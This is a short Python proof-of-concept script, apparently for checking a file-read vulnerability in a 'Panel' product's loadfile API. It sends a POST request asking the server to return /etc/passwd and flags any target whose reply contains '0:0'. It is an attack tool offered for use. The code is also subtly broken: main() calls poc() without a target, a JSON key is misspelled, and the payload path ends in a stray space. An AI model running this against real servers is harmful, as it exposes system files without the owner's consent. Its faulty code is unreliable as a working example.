#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test="""
 _____ _  _     _____   ____  _____ ____  ____  _  _      _____
/    // \/ \   /  __/  /  __\/  __//  _ \/  _ \/ \/ \  /|/  __/
|  __\| || |   |  \    |  \/||  \  | / \|| | \|| || |\ ||| |  _
| |   | || |_/\|  /_   |    /|  /_ | |-||| |_/|| || | \||| |_//
\_/   \_/\____/\____\  \_/\_\\____\\_/ \|\____/\_/\_/  \|\____\
                                                               


"""
    print(test)
#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description="Panel loadfile 后台文件读取漏洞")
    parse.add_argument('-url','--url',dest='url',help='input your url')
    args = parse.parse_args()
    if args.url:
        poc()
#poc函数
def poc(target):
    payload ='/api/v1/file/loadfile ' 
    data = {"paht":"/etc/passwd"}
    try:
        res = requests.post(url=target + payload,json=data,verify=False)
        if res.status_code == 200 and '0:0' in res.text:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞') 
    except:
        pass
#函数入口
if __name__ == "__main__":
    main()